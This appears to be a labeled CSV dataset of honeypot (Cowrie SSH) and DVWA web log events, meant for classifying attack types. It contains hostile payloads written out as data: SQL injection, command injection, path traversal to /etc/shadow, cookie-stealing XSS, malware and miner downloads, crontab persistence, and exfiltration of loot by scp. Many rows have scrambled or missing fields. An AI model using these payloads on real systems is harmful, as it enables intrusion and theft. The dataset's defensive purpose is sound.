text,label
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls ~/.ssh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:172.31.249.189 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3buname+-a&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:192.168.49.42 username:- password:- command:ufw disable request:-,SSH_COMMAND-COWRIE
source:cowrie event:recon ip:252.215.215.185 username:- password:- command:- request:-,RECON-COWRIE
"source:DVWA event:RECON ip:10.245.224.193 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fenviron HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:last request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:203.169.28.127 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success username:root password:summer command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:172.23.35.67 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:91.247.215.53 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:free request:-,SSH_COMMAND-COWRIE
"event:LOGIN ip:192.168.244.137 username:- password:- command:- /dvwa/login.php request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:103.56.127.3 username:- password:- command:- request:""GET /dvwa/vulnerabilities/csrf/ HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+table_name%2cnull+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:103.188.90.35 username:rabbitmq password:qwerty123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat request:- /proc/version,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:91.149.41.52 username:hadoop password:admin123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:172.23.96.236 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 password:- username:- command:cat /var/log/faillog request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:172.25.54.56 username:apache password:dietpi command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input username:- ip:192.168.244.137 password:- request:-,SSH_COMMAND-COWRIE
"event:RECON ip:91.142.191.205 username:- password:- command:- /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fshadow request:""GET HTTP/1.1""",RECON-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls -la request:-,SSH_COMMAND-COWRIE
"event:RECON source:DVWA ip:172.28.14.179 username:- command:- request:""GET /dvwa/vulnerabilities/brute/?username=admin&password=admin&Login=Login HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:203.121.249.155 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:103.9.136.243 username:grafana password:P@ssw0rd command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:103.84.142.194 username:- password:- command:zip -r /tmp/loot.zip /etc/passwd /etc/shadow request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:203.189.210.1 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1+%26%26+ls+-la+/tmp&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:10.36.181.128 username:- password:- command:apt-get install -y nmap request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:who request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.244.137 username:root password:root command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:185.123.147.42 username:- password:- command:ls -la /var/www request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.205.66.112 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;EXEC+xp_cmdshell('whoami')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.49.129.234 username:- password:- command:ls -la /opt request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:adduser hacker request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:10.24.226.136 username:sync password:000000 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:45.154.38.87 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit HTTP/1.1""",XSS-DVWA
source:cowrie event:cowrie.client.version ip:57.116.103.235 username:- password:- command:- request:SSH-2.0-OpenSSH,RECON-COWRIE
source:cowrie event:cowrie.login.failed ip:10.148.81.26 username:proxy password:letmein command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.33.102 password:- username:- command:wget http://malware.com/bot.sh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.73.140.243 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:45.248.33.192 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
source:cowrie ip:45.191.242.227 event:cowrie.command.input password:- command:systemctl start backdoor request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.160.16.69 username:- request:""POST password:- /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.166.49.74 username:- password:- command:find / -writable 2>/dev/null request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.85.151.169 username:- password:- /tmp/payload.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:172.19.241.224 username:- password:- command:cat /proc/cpuinfo request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:185.176.196.77 username:user password:guest command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:91.49.59.188 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:172.22.32.71 username:pi password:P@ssw0rd command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:103.188.55.225 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:192.168.215.240 username:vault password:password1 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:103.232.183.214 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user%28%29%2cversion%28%29+--&Submit=Submit",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:185.146.178.180 username:- password:- command:kill -9 -1 request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.72.97.6 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:192.168.14.172 username:proxy password:000000 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA ip:10.131.158.74 username:- command:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:45.5.120.249 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fenviron HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:91.150.43.6 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bcat+/etc/passwd&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:10.154.167.224 username:- command:cat password:- request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.108.81.241 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.243.53.121 username:- password:- command:echo '* * * * * root /tmp/bot.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:172.24.244.88 username:vault password:root command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.failed ip:10.254.5.59 username:consul password:P@ssw0rd command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:10.74.233.16 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:203.143.167.58 password:vagrant username:pi command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:91.111.236.140 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:45.136.228.133 username:list password:letmein1 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN password:- ip:192.168.108.182 command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:45.164.29.252 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:185.25.160.178 username:list password:000000 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:10.229.101.37 username:user password:admin123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.88.139 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:45.178.2.31 username:- password:- command:cat ~/.ssh/id_rsa request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.133.41.232 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /root request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:203.56.35.96 username:- password:- command:find / -name 'id_rsa' 2>/dev/null request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:91.216.137.254 password:dragon username:admin command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3b+DROP+TABLE+users+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:45.239.13.46 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+table_name%2cnull+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:91.252.70.218 username:uucp password:secret command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:whoami request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:45.238.105.211 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:45.33.18.231 username:- password:- command:- request:""GET /dvwa/phpinfo.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:203.9.71.77 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.104.58.179 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:172.26.16.116 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2fwww%2fhtml%2fdvwa%2fconfig%2fconfig.inc.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:45.66.130.246 username:- password:- command:cat /etc/hosts request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:who request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:203.55.50.75 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.200.93 username:- password:- command:zip -r /tmp/loot.zip /etc/passwd request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.1.137.213 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON password:- username:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bid&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:10.47.186.56 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:10.154.207.212 username:test password:hello command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:203.209.200.233 username:prometheus password:password1 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:185.116.77.232 password:- username:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.success ip:91.134.38.81 username:proxy password:alpine command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:10.158.21.143 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit request:""GET HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:203.22.78.240 username:- password:- command:lastlog request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.148.83.254 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:10.53.115.86 username:proxy password:welcome1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:free request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:203.18.219.138 username:- password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:203.100.63.214 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:103.138.140.59 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.141.167 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:45.26.85.53 username:guest password:letmein command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:superman command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.207.144 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:185.150.191.89 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+1=1--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:103.151.130.49 username:- password:- command:chmod +x bot.sh request:-,SSH_COMMAND-COWRIE
source:cowrie ip:185.26.163.128 username:- command:iptables password:- -F request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep%285%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
event:cowrie.login.success ip:192.168.244.137 username:root password:superman command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.12.184.208 username:- -a command:uname request:-,SSH_COMMAND-COWRIE
"event:LOGIN ip:192.168.244.137 username:- command:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:172.21.147.86 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bid&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:203.82.215.46 username:- password:- command:clear request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success username:pi ip:192.168.108.172 password:admin command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:185.78.174.70 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:45.150.23.15 username:git password:welcome1 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:103.170.152.98 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.43.155.80 username:- password:- command:iptables -P INPUT ACCEPT request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:91.203.38.8 username:hadoop password:vagrant command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+HAVING+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:185.196.134.47 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:203.248.200.242 username:postgres password:123456 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:103.229.39.173 username:nginx password:password command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:91.229.216.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA ip:45.98.207.235 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:203.233.122.106 username:- password:- command:scp /tmp/loot.zip attacker@10.0.0.1:/tmp/ request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:91.131.199.75 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:91.254.110.173 username:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fssh%2fsshd_config HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+a%3da&Submit=Submit HTTP/1.1""",SQLI-DVWA
"event:LOGIN username:- ip:185.160.137.15 password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:103.21.155.67 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ifconfig request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2froot%2f.bash_history HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:10.75.242.151 username:- password:- command:wget http://45.33.32.156/miner request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:10.122.194.209 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+@@datadir,@@basedir--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:10.160.116.15 username:- password:- command:find -name / 'id_rsa' 2>/dev/null request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.111.152.204 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.34.128 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.session.connect ip:183.151.233.211 username:- password:- command:- request:-,RECON-COWRIE
"source:DVWA event:LOGIN ip:192.168.100.108 username:- password:- command:- /dvwa/login.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.success ip:185.194.171.29 username:svn password:letmein command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:91.156.17.251 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.126.122 username:pi password:password command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:91.211.19.216 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+2%3e1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+table_name%2cnull+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:91.98.171.159 username:grafana password:dietpi command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.206.99 username:elastic password:12345 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.54.11 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.failed ip:103.81.141.254 username:jenkins password:dragon command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /home request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:45.29.203.158 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:45.139.62.63 password:- request:""GET command:- /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:203.105.96.59 username:- password:- command:- request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:10.179.43.5 username:git password:shadow command:- request:-,BRUTE_FORCE_SSH-COWRIE
